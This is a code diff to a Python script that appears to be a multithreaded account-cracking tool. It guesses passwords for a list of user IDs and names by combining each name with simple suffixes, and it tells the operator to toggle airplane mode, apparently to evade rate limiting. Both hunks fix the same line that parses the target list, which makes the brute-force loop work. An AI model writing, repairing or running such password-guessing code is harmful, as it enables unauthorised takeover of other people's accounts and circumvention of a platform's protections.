@@ -337,7 +337,7 @@ def ___metode___():
         print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
         with ThreadPoolExecutor(max_workers=35) as (hayuk):
             for user in ids:
-                uid, Name = user.split(' ')[0]
+                uid, Name = user.split('<=>')
                 ox =  Name.lower().split(' ')[0]
                 if ___password___ in ['1','01']:
                     pwx = [Name,ox[0]+'123'+ox[0]+'12345']
@@ -367,7 +367,7 @@ def ___metode___():
         print("%s[%s!%s]%s Use Airplane Mode In Numbers1000,2000...\n"%(B,M,B,P))
         with ThreadPoolExecutor(max_workers=35) as (hayuk):
             for user in ids:
-                uid, Name = user.split(' ')[0]
+                uid, Name = user.split('<=>')
                 ox = Name.lower().split(' ')[0]
                 if ___password___ in ['1','01']:
                     pwx = [Name,ox[0]+'123'+ox[0]+'12345']
